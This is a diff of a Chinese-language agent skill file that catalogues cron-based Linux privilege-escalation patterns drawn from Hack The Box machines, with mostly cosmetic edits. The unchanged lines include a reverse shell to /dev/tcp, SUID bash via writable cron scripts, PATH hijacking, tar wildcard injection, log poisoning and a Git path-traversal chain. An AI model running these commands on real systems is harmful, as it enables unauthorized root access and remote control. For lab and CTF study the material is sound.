@@ -4,11 +4,10 @@ description: 'Cron Job Abuse 提权模式库：可写脚本/PATH劫持/通配符
 disable-model-invocation: true
 metadata: { domain: linux, tier: T2 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
 
 # Cron Job Abuse 提权模式库
 
-> 来自 350+ HTB 机器统计: Easy 10台 + Medium 11台 + Hard/Insane 多台 = **20+ 台机器**用 cron 提权。是最常见的 Linux 提权向量之一。
+> 来自 20+ 台 HTB 机器统计：Easy 10台 + Medium 11台 + Hard/Insane 多台。是最常见的 Linux 提权向量之一。
 
 ## 模式 1: 可写脚本 (Writable Script) — 最常见
 
@@ -29,7 +28,7 @@ echo '#!/bin/bash' > /path/to/cron_script.sh
 echo 'chmod +s /bin/bash' >> /path/to/cron_script.sh
 # 或反弹 shell:
 echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' >> /path/to/cron_script.sh
-```
+```text
 
 ## 模式 2: PATH Hijack（PATH 劫持）
 
@@ -41,7 +40,7 @@ cat /etc/crontab | grep -v '^#'
 echo '#!/bin/bash' > /tmp/cp
 echo 'chmod +s /bin/bash' >> /tmp/cp
 chmod +x /tmp/cp
-```
+```text
 
 ## 模式 3: 通配符注入 (Wildcard Injection)
 
@@ -50,21 +49,21 @@ chmod +x /tmp/cp
 touch '--checkpoint=1'
 touch '--checkpoint-action=exec=bash shell.sh'
 # tar cf ... * 时, * 展开为文件名 → tar 参数注入
-```
+```text
 
 ## 模式 4: Cron + 日志/邮件投毒
 
 ```bash
 # cron 脚本读取日志或邮件 → 投毒输入
 echo "ERROR; /bin/bash -c '...'" >> /var/log/app.log
-```
+```text
 
 ## 模式 5: @reboot Cron（重启触发）
 
 ```bash
 crontab -l | grep @reboot
 # 如果指向可写脚本 → 写入 → 等重启
-```
+```text
 
 ## 🆕 模式 6: Git Template Sync 路径穿越（来源 Nexus）
 
@@ -76,7 +75,7 @@ systemctl list-timers --all | grep -i "git\|sync\|template"
 # 1. timer 以什么用户运行？（root?）
 # 2. 脚本是否用 os.path.join() 拼接 git ls-tree 输出的路径？
 # 3. 攻击者能否控制 Git repo？（能 push？能创建 template repo？）
-```
+```text
 
 **利用链**:
 1. 创建 Gitea template 仓库
@@ -106,7 +105,7 @@ systemctl list-timers --all | grep -i "git\|sync\|template"
 [ ] /tmp 下的脚本: 竞态条件？→ 替换
 [ ] 🆕 脚本用了 git ls-tree？→ 路径穿越
 [ ] 🆕 脚本用了 os.path.join 且第二个参数来自外部？→ 路径穿越
-```
+```text
 
 ## 教训
 
